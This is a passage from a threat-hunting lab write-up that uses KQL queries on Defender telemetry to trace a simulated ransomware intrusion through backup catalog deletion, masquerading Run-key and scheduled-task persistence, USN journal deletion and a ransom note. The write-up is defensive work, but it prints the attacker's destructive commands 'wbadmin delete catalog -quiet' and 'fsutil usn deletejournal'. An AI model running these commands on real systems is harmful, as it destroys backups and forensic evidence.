| where ProcessCommandLine has_any ("wbadmin", "catalog")
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-12-05))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1366" height="121" alt="" src="https://github.com/user-attachments/assets/1aade9e2-86a3-4f5d-9690-738556d3d4be" />

**Command**

```cmd
wbadmin delete catalog -quiet
```

**Findings Flag 22**
The backup catalog was deleted, removing all references to available backups.

<details>
<summary>KQL breakdown</summary>
<p><b>wbadmin</b> is a native Windows backup administration utility; filtering for <b>wbadmin</b> and <b>catalog</b> identifies commands that remove backup metadata, which degrades restore workflows even if backup files exist, consistent with recovery inhibition behavior.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step shows backup catalog removal to disrupt backup management and restoration, further reducing the victim’s ability to recover without paying ransom.</p>
</details>

---

## 🔒 PHASE 4 — Persistence (Flags 23–24)

### FLAG 23 — Registry Autorun

MITRE: T1547.001 – Registry Run Keys / Startup Folder
Flag Format: RegistryValueName
Question: What registry value establishes persistence?

```kql
DeviceRegistryEvents
| where DeviceName == "azuki-adminpc"
| where RegistryKey has @"\CurrentVersion\Run"
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-12-05))
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp asc
```

<img width="1717" height="232" alt="" src="https://github.com/user-attachments/assets/8f354226-9de7-48f1-bd29-3c798a3308a3" />

**Registry Value Name**

```
WindowsSecurityHealth
```

**Findings Flag 23**
Malware was configured to execute automatically at user logon via a Run key persistence mechanism.

<details>
<summary>KQL breakdown</summary>
<p><b>DeviceRegistryEvents</b> is used to detect registry modifications; filtering for <b>\CurrentVersion\Run</b> targets a common autorun persistence location, and projecting <b>RegistryValueName</b> and <b>RegistryValueData</b> identifies the persistence entry label and the program path configured to execute at logon.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step identifies registry-based persistence by locating a Run key value created during the incident window, confirming an attempt to execute malware automatically after user logon.</p>
</details>

---

### FLAG 24 — Scheduled Task

MITRE: T1053.005 – Scheduled Task/Job
Flag Format: Full task path
Question: What scheduled task was created?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("schtasks")
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-12-05))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1720" height="127" alt="" src="https://github.com/user-attachments/assets/ac9f175d-a4c0-4d09-bba8-1df63f772edd" />

**Task Path**

```
Microsoft\Windows\Security\SecurityHealthService
```

**Findings Flag 24**
A scheduled task masked as Security Health Service ensures privileged persistence and automatic malware execution after reboot.

<details>
<summary>KQL breakdown</summary>
<p>Searching <b>DeviceProcessEvents</b> for <b>schtasks</b> identifies creation or modification of Windows scheduled tasks; scheduled tasks are a common persistence method because they can run with elevated privileges and survive reboots while appearing legitimate if named similarly to system components.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms scheduled task persistence by identifying task creation activity and capturing the task path used to maintain execution across reboots.</p>
</details>

---

## 🧹 PHASE 5 — Anti-Forensics (Flag 25)

### FLAG 25 — Journal Deletion

MITRE: T1070.004 – Indicator Removal on Host - File Deletion
Flag Format: Full command line
Question: What command deleted forensic evidence?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("usn","journal","fsutil")
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-12-05))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1675" height="287" alt="" src="https://github.com/user-attachments/assets/b3165547-700c-468b-9133-2a7e5dd3d4be" />

**Command**

```cmd
fsutil.exe usn deletejournal /D C:
```

**Findings Flag 25**
The NTFS USN journal was deleted to remove file activity artifacts and hinder forensic reconstruction.

<details>
<summary>KQL breakdown</summary>
<p>The terms <b>fsutil</b>, <b>usn</b>, and <b>journal</b> are used to locate filesystem utility activity that manipulates NTFS journaling; deleting the USN journal reduces the ability to reconstruct file activity timelines, aligning with anti-forensics objectives.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms anti-forensics by identifying explicit deletion of NTFS journaling artifacts, which can impair post-incident file activity reconstruction.</p>
</details>

---

## 💀 PHASE 6 — Ransomware Success (Flag 26)

### FLAG 26 — Ransom Note

MITRE: T1486 – Data Encrypted for Impact
Flag Format: filename.txt
Question: What is the ransom note filename?

```kql
```

<img width="1485" height="290" alt="" src="https://github.com/user-attachments/assets/6d8afd6b-8376-4364-8767-a8cb117c58ce" />

**Ransom Note**

```txt
SILENTLYNX_README.txt
```

**Findings Flag 26**
A ransom note was dropped on the system, confirming successful encryption and attacker objective completion.

<details>
<summary>KQL breakdown</summary>
<p>This flag is typically supported by <b>DeviceFileEvents</b> searches for file creation patterns (e.g., a note <b>.txt</b> created across folders) and correlation to the incident window; the goal is to identify the note filename used as a post-encryption indicator.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms ransomware completion by identifying the note filename associated with payment instructions, used as evidence that encryption and attacker impact objectives were achieved.</p>
</details>

---

**Last Interaction**

```kql
DeviceProcessEvents
| where DeviceName has "azuki"
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-12-31))
| summarize FirstInteraction=min(Timestamp), LastInteraction=max(Timestamp), Events=count() by DeviceName
| order by FirstInteraction asc
```

<img width="1156" height="290" alt="" src="https://github.com/user-attachments/assets/a43203c7-d366-4ae2-9b9f-4c512b9d2dd9" />

Verifying last interaction.

```kql
DeviceProcessEvents
| where DeviceName == "azuki-sl"
| where Timestamp between (datetime(2025-12-05) .. datetime(2025-12-06))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1712" height="311" alt="" src="https://github.com/user-attachments/assets/1af9c6cd-0784-4cc3-93d3-e19b104a107d" />

Findings: just regular system processes running. The last interaction from compromised devices was 05/12/2025, 11:46:33.527 UTC.

---

## 4. Final Assessment

This incident represents a complete, end-to-end ransomware operation:

* Credential abuse
* Backup destruction (Linux + Windows)
* Automated lateral movement
* Recovery inhibition
* Persistence
* Anti-forensics
* Successful encryption

**Impact:** Critical
**Detection Gap:** High
**Confidence:** High (evidence corroborated across MDE telemetry)

